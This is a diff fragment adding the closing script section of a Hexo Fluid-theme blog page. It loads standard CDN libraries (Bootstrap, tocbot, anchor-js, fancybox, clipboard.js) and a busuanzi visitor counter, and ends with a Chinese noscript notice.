+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
 </html>
